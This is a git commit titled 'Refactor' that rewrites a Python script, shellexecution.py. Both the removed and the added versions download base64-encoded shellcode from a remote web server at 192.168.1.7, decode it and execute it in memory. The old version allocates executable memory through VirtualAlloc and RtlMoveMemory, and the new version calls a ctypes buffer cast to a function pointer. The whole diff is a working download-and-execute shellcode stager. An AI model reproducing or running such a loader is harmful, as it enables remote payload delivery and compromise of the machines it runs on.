aa5efd25383c58177c27d9d57f471c5a364c1598
Mislav <mislav@pop-os.localdomain>
2021-05-30 16:43:34 +0200

    Refactor

--- shellexecution.py
+++ shellexecution.py
@@ -1,41 +1,19 @@
-from urllib import request
-
-import base64
+import urllib2
 import ctypes
+import base64
 
+# retrieve the shellcode from our web server
+url = "http://192.168.1.7:8100/shellcode.bin"
+response = urllib2.urlopen(url)
 
-kernel32 = ctypes.windll.kernel32
+# decode the shellcode from base64 
+shellcode = base64.b64decode(response.read())
 
+# create a buffer in memory
+shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
 
-def get_code(url):
-    with request.urlopen(url) as response:
-        shellcode = base64.decodebytes(response.read())
+# create a function pointer to our shellcode
+shellcode_func   = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
 
-    return shellcode
-
-
-def write_memory(buf):
-    length = len(buf)
-
-    kernel32.VirtualAlloc.restype = ctypes.c_void_p
-    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
-
-    kernel32.RtlMoveMemory.argtypes = (
-        ctypes.c_void_p,
-        ctypes.c_void_p,
-        ctypes.c_size_t)
-    kernel32.RtlMoveMemory(ptr, buf, length)
-    return ptr
-
-
-def run(shellcode):
-    buf = ctypes.create_string_buffer(shellcode)
-    ptr = write_memory(buf)
-    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
-    shell_func()
-
-
-if __name__ == '__main__':
-    url = "http://192.168.1.7:8000/my32shellcode.bin"
-    shellcode = get_code(url)
-    run(shellcode)
+# call our shellcode
+shellcode_func()
